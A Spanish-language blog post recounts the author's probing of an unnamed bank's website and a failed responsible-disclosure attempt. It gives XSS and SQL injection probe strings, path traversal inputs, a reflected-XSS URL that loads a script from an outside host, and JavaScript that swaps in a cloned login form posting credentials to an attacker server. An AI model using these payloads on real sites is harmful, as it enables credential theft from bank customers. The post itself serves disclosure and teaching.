---
title: "Hackeando un Banco Caso Real XSS Sensitive Data Exposure explicacin SQLi"
date: Mon, 16 Apr 2018 10:23:00 -0300
draft: false
type: posts
categories: 
- Seguridad,Seguridad Web,Sensitive Data Exposure,SQLi,Tips,XSS
---
# Hackeando un Banco Caso Real XSS Sensitive Data Exposure explicacin SQLi

<br/>

<br/>
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgl2I1GmakJYZopMi2ZoIcdK-X3JA0f4sOCvv_HAOaJbrpU8tJpIRvoA8LKjLeW-rywEOgf8HiaufBWSVaqxzH7ImdAPTqrgCuA3_JMDxLEVHrXEOxQwaEXIlXgc-uvulus6BERkHr82ME1/s640/bank_hacked.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgl2I1GmakJYZopMi2ZoIcdK-X3JA0f4sOCvv_HAOaJbrpU8tJpIRvoA8LKjLeW-rywEOgf8HiaufBWSVaqxzH7ImdAPTqrgCuA3_JMDxLEVHrXEOxQwaEXIlXgc-uvulus6BERkHr82ME1/s1600/bank_hacked.png)

  
 Hace tiempo que no escribo, pero ahora amerita la ocasión... Estoy acostumbrado a escribir reportes de seguridad de las vulnerabilidades que encuentro en los sitios webs que visito, para mandárselo al encargado del sitio o webmaster. Normalmente cuando se encuentra un bug, es muy probable que se encuentren muchos más ya que en la mayoría de casos los errores los encuentro poniendo un "<marquee>" o una comilla simple  en cualquier parámetro _**GET**_ o _**POST**_ que encuentre. **Ejemplo:**

```
http://www.sitio.com/index.php?id=1<marquee>
http://www.sitio.com/index.php?id=1'
```

  

 Como ya muchos sabrán el primero es para encontrar [**XSS**](https://www.owasp.org/index.php/Cross-site_Scripting_\(XSS\)) y el segundo para encontrar [**SQLi**](https://www.owasp.org/index.php/SQL_Injection), pero también sirven para encontrar [**LFI**](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion), [**Remote File Inclusion**](https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion),  [**Directory file include**](https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_\(OTG-AUTHZ-001\)), **[inyección de código](https://www.owasp.org/index.php/Code_Injection), [inyección de comandos](https://www.owasp.org/index.php/Command_Injection)**... Existen muchos tipos de vulnerabilidades que se pueden encontrar con una simple comilla o un carácter no alfanumérico.

  

 En el primer caso ( **_?id=1<marquee>_** ) si la página se mueve es vulnerable a XSS, si en algún campo de la web aparece <marquee> todavía es vulnerable a XSS pero hay que buscar algún bypass y eso es aburrido y tedioso.

  

 En el segundo caso ( _**?id=1'**_ ), solo voy a explicar el caso del **SQLi** ya que no es la finalidad de este post explicar en detalle todos los tipos de ataques, esta es solo la introducción de a lo que quiero llegar... Pues bueno, si al poner la comilla simple lanza un _Error 404 (Not Found)_ probablemente el sitio no sea vulnerable a SQLi, pero si te encuentras con un error del tipo:

```
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

 Significa que es **vulnerable a SQLi**, si no aparece ese mensaje, pero el servidor responde un _Error 500 (Internal Server Error)_ o no responde nada (la página queda en blanco o no muestra resultados) hay que remplazar la comilla por un _**and 1=1**_ y por un _**and 1=2**_ **Ejemplo:**

```
http://www.sitio.com/index.php?id=1 and 1=1
http://www.sitio.com/index.php?id=1 and 1=2
```

  
 Si en el primer caso el contenido aparece bien, igual que sin el _**and 1=1**_, y en el segundo caso no aparece nada, significa que es **vulnerable a [Blind SQLi](https://www.owasp.org/index.php/Inyecci%C3%B3n_SQL_Ciega)**.  
  

 Como ven, con simples 2 o 3 pasos que verifiques cada vez que visites una web y veas algún _**?parameter=value**_ en la bara de direcciones, puedes encontrar muchos sitios webs vulnerables a diferentes tipos de ataques como los descritos arriba. (**\*Nota:** muchos parámetros están embellecidos como rutas, por ende también puedes encontrar parámetros GET que se pasan con el formato _**/parameter/value**_)

  

 Es en esa rutina de poner comillas me encuentro con que en el sitio web de un importante Banco, donde pongo una comilla en un parámetro _**script.aspx?Id=12'**_  y encuentro un error que filtra mucha información del servidor donde se aloja:

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqMT4MCDsMuImmqX20DW6504YQPb49HWhgfbcRHSJWCZyXYQX58jc0lkeN-Z3XrgASuBgdCMGfuZnsCXRDoknjoQaeDlNnD9qO_C1zJtMItfa6WaQepVb0gCA_sr5LGtn5vSeAbSrP3FMq/s640/1_error.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqMT4MCDsMuImmqX20DW6504YQPb49HWhgfbcRHSJWCZyXYQX58jc0lkeN-Z3XrgASuBgdCMGfuZnsCXRDoknjoQaeDlNnD9qO_C1zJtMItfa6WaQepVb0gCA_sr5LGtn5vSeAbSrP3FMq/s1600/1_error.png)

  

 Esta es una vulnerabilidad llamada [**Sensitive Data Exposure**](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure), el problema radica en que está activado el modo debug o modo desarrollador, por lo tanto se puede ver un útil reporte del error para los desarrolladores, pero que muestra demasiada información a terceros.  
  
**Datos obtenidos:**  

-    Sistema operativo del servidor.
-    Versión .NET Microsoft Framework.
-    Versión ASP.NET.
-    Ruta absoluta del proyecto en el servidor.
-    Extractos de código múltiple errores y logs.

  

 A primera vista no pareciera ser una vulnerabilidad seria, pero un hacker puede usar esta información para buscar la aplicación y su versión en repositorios de vulnerabilidades y exploits, para verificar si existe algún exploit listo para descargar, ejecutar y tomar el sistema. Por otro lado, solo le damos más información a un atacante para que busque vulnerabilidades más serias en el resto de las rutas y logs filtrados.

  

 Por suerte para el Banco al intentar inyectar código no se puede ya que las parámetros son _saneados_ (a los valores se les quita algunos caracteres famosos por ser usados para inyectar código como por ejemplo **' < >**), pero aun así se pueden inducir diferentes errores:

  

```
https://www.banco.xxx/ruta/script.aspx?Id=58l
Error: Could not find a part of the path "C:\ruta\home58l\link.inc".

https://www.banco.xxx/ruta/script.aspx?Id=58:1
Error: Invalid path for MapPath '/ruta/home58:1//link.inc'. A virtual path is expected.

https://www.banco.xxx/ruta/script.aspx?Id=58"l
Error: Illegal characters in path.
```

  
 También se puede inyectar la ruta de otra carpeta, pero por suerte para el Banco, a la consulta se le concatena el nombre de un archivo que debe existir dentro de la carpeta, así que solo se puede ver contenido de carpetas con el archivo concatenado en la consulta.  
  

```
https://www.banco.xxx/ruta/script.aspx?Id=58/../carpeta59/
200 OK!
```

  
 Por mi falta de conocimiento en ASP y NET es que me rindo de intentar buscar más formas de vulnerar el sistema, y como dije antes, si encuentras una vulnerabilidad, es posible que encuentres muchas más... Es así como encuentro un XSS:  
  

```
https://www.banco.xxx/ruta/script.aspx?Id=58<marquee>
```

 Se mueve todo así que es vulnerable a XSS, ahora pruebo con una imagen:  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhr51RBWEzW5lR_pj6DvAPoB-enOpNuod0F4UGU_EWhfWEoYMJOFhx8CmuthuRsTM57USB1taTeWhkm-9ZsGkIFjTkt-ETgJm0OPxLvL2Am1xIVRo8gHqGC7INZ2qVc0gRn9JED5_6weIXi/s640/2_xss.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhr51RBWEzW5lR_pj6DvAPoB-enOpNuod0F4UGU_EWhfWEoYMJOFhx8CmuthuRsTM57USB1taTeWhkm-9ZsGkIFjTkt-ETgJm0OPxLvL2Am1xIVRo8gHqGC7INZ2qVc0gRn9JED5_6weIXi/s1600/2_xss.png)

  
 Dos de los ataques más comunes que se pueden hacer para sacar provecho de un XSS, es el **robo de cookies** de sesión y la **suplantación de formularios de acceso** (usuario/contraseña). El robo de cookies no será efectivo ya que el Banco tiene un sistema de sesiones únicas por ende la cookie sólo sirve para recibir un mensaje de error, por tanto decido una suplantación de formularios de acceso.

  
 La forma más fácil de hacer esto es inyectando un código javascript que borre todo el contenido en la página web legítima y ponga los formularios para mandar las credenciales a un servidor que controle el atacante.  
  

```
https://www.banco.xxx/ruta/script.aspx?Id=97"><script type="text/javascript" src="http://yourjavascript.com/000000/a.js"></script>
o
https://www.banco.xxx/ruta/script.aspx?Id=97%22%3E%3Cscript%20type=%22text/javascript%22%20src=%22http://yourjavascript.com/000000/a.js%22%3E%3C/script%3E
```

  
 El javascript es muy sencillo y su sintaxis es esta:  

```
var html = `
<html>
<body>
<h1>Página web del Banco</h1>
<p><marquee>El banco más seguro del mundo.</marquee></p>
</body>
</html>
`;

document.body.innerHTML = html;
```

  
 Dentro de _**var html = \`<!-code here->\`;**_ se copia y pega el código de la página web de acceso del sitio web légitimo, se debe cambiar las rutas relativas agregando la url de la web original:  

```
De: <link rel="stylesheet" type="text/css" href="/login/assets/style.css">
A:  <link rel="stylesheet" type="text/css" href="https://www.banco.xxx/login/assets/style.css">
```

  
Por último y más importante, se debe reemplazar el _action_ del formulario a un script en PHP que guarde las credenciales en un servidor controlado por el atacante:  

```
De: <form action="/login.php" method="post">
A:  <form action="https://hacker-server.com/pass.php" method="post">
```

  
 Se puede ir viendo como queda el resultado apretando **F12** en cualquier web y pegando el código en la consola javascript:  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqTMMSWrNI67ZuzEHkg858BgdINz09YlF0H_hErEYsOhjGkIrsHGpKi2INucByyShGdhyphenhyphencY8yHxE_p9D7FbZ-Ok3U1E2dkz3nP9EiIqxpBMVAI_0gQg2w5FY-Ed8veJQA88RP6mLeoe7TK/s1600/04_javascript_consola.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqTMMSWrNI67ZuzEHkg858BgdINz09YlF0H_hErEYsOhjGkIrsHGpKi2INucByyShGdhyphenhyphencY8yHxE_p9D7FbZ-Ok3U1E2dkz3nP9EiIqxpBMVAI_0gQg2w5FY-Ed8veJQA88RP6mLeoe7TK/s1600/04_javascript_consola.png)

  
 Como es una prueba de concepto para mandar un reporte con la vulnerabilidad, el script en PHP que intercepta las credenciales simplemente será un script que muestre los parámetros POST en pantalla:  

```
<?php
echo "<pre>";
print_r($_POST);
echo "</pre>";
?>
```

  
 Ya todo está listo y el PoC funciona perfecto:  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPuIOTsuYBEcXTxsR3bXB4bKWWR8Qk5vWtIH4-B2ernILz2FoK1nt8BbIginphDAVyMZKUNJRdYFYY4JekkSr54NGtPlnawxFklKv5wJb2empf5ZpoTKVztlZ2FgQsA8SvLyKkLJ874N75/s640/3_xss_funcional.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPuIOTsuYBEcXTxsR3bXB4bKWWR8Qk5vWtIH4-B2ernILz2FoK1nt8BbIginphDAVyMZKUNJRdYFYY4JekkSr54NGtPlnawxFklKv5wJb2empf5ZpoTKVztlZ2FgQsA8SvLyKkLJ874N75/s1600/3_xss_funcional.png)

  
 Y cuando ingresan sus credenciales se envían al servidor del atacante:  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDNJ8pCZrrSdqheDdTM2kATBOlP_3N8JebfA0pYgVPW3Nk09TnU3N5cvYPaoYmqxQ8QxS9nO6rMnpAtrVdiuIt_RGpTO5s3IJdf4zgIcYINYPO5f70SOv7lRm-7iF-KbiZazP15Tg4oIwv/s1600/4_post_password.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgDNJ8pCZrrSdqheDdTM2kATBOlP_3N8JebfA0pYgVPW3Nk09TnU3N5cvYPaoYmqxQ8QxS9nO6rMnpAtrVdiuIt_RGpTO5s3IJdf4zgIcYINYPO5f70SOv7lRm-7iF-KbiZazP15Tg4oIwv/s1600/4_post_password.png)

  
**Envío del reporte y respuestas**  
  
 Una vez con el reporte listo y con el PoC funcionando intento buscar alguna forma de contactarme con el Banco para enviárselo... No encuentro nada, así que uso una herramienta llamada [**contact.sh**](https://www.kitploit.com/2018/02/contactsh-osint-tool-to-find-contacts.html) que es un script que intenta varios métodos y convenciones para encontrar al encargado de un sitio web... Y nada nuevamente, así que me digno a escribirles a través de Twitter y me responden diciendo que escriba a un correo que me dieron.  
  
 Escribo al correo proporcionado y no me responden en varios días, ni siquiera un "Recibido, muchas gracias", así que de nuevo pido a través de Twitter algún mail para poder enviar el reporte.... YYY, visto!  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmSqvt8iO_ZFSx2_Ywj35RwvEy-a3Z6jrU73fBQH8jfmBgvUvJe8qjU_C4Wmj2Q8NucYwajAkUxqBdhJeDnpg2J6pUt1luKMOjuG1OmEXCXBHfIiJdgfmJWoJesbnfCJaHzZuOCJlvmMI6/s400/5_twitter_sin_respuesta.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmSqvt8iO_ZFSx2_Ywj35RwvEy-a3Z6jrU73fBQH8jfmBgvUvJe8qjU_C4Wmj2Q8NucYwajAkUxqBdhJeDnpg2J6pUt1luKMOjuG1OmEXCXBHfIiJdgfmJWoJesbnfCJaHzZuOCJlvmMI6/s1600/5_twitter_sin_respuesta.png)

  
 A la semana me llega un mail:  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6TPdLEXFoz_QplsqtGlmJgmygQm4XmMRbxmtsO26EQFkfNQfkGkDP_5SUZx2us_GLnWclhejfTQeQklExD9kUF40XfIyFGEbH0vtCtWtTm2NdYey4sf-93hzT_mUaIvHchlP0mPUdpg0X/s640/6_mail_ejecutivo.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6TPdLEXFoz_QplsqtGlmJgmygQm4XmMRbxmtsO26EQFkfNQfkGkDP_5SUZx2us_GLnWclhejfTQeQklExD9kUF40XfIyFGEbH0vtCtWtTm2NdYey4sf-93hzT_mUaIvHchlP0mPUdpg0X/s1600/6_mail_ejecutivo.png)

  
  
 Como pueden ver me mandaron el mail de un especialista en marketing y clientes, y no el de un especialista en seguridad, probablemente esas dos áreas estén muy separadas dentro del Banco y ni si quiera se comuniquen, así que el reporte de seguridad quedó archivado como un reclamo de cliente...  
  
 Y un día después del mail me llaman:  
  
**Yo:** Alo?  
**Telefonista:** Hola, llamamos del Banco X para informarte que tu reclamo fue derivado al área que corresponde.   
**Yo:** No es un reclamo, es un reporte de seguridad. A qué área lo derivaron?  
**Telefonista:** No lo sé, nosotros somos el área de clientes, pero te van a contactar!  
**Yo:** Ok! Gracias por la información, Adiós!....... Espera, tienen Bug Bounty?  
**Telefonista:** \[Cuelga\]

  
 Hasta el día de hoy, nadie me ha contactado y las vulnerabilidades se mantienen exactamente como el primer día que las reporté. Ya pasó más de un mes y al parecer no hay intención de arreglarlo, así que me decidí a escribir este post.  
  
**Conclusiones**  
  
 Los XSS son vulnerabilidades que tienen un impacto bajo hoy en día, el ataque que mostré arriba, solo puede ser replicado en Firefox ya que todos los demás browsers bloquean los posibles XSS, eso no exime de responsabilidades a los encargados de seguridad. Como pueden ver también el Banco no tiene protocolos para reportar bugs y mucho menos un programa de Bug Bounty. La situación es peor ya que investigando un poco más, el Banco terceriza el desarrollo de aplicaciones (contrata una empresa externa para que las haga), eso en muchos casos es útil, pero en un Banco que maneja datos sensibles de clientes no debería tener permitido traspasar datos a empresas externas, menos delegar la seguridad a ellos. Hay que notar también que las tecnologías usadas para el desarrollo de aplicaciones bancarias ya están obsoletas y los problemas presentados anteriormente son en gran medida por usar Frameworks anticuados que no validan como corresponden los inputs y malas configuraciones.  
  
Las pruebas de concepto que se presentan arriba fueron realizadas con la finalidad de demostrar el impacto que pueden tener y en ningún momento fueron usadas con otra finalidad.  
  
\[+\] Salu2  
\[!\] Zion3R

#### [Source](http://www.blackploit.com/2018/04/hackeando-un-banco-caso-real-xss.html)

<br/>
---
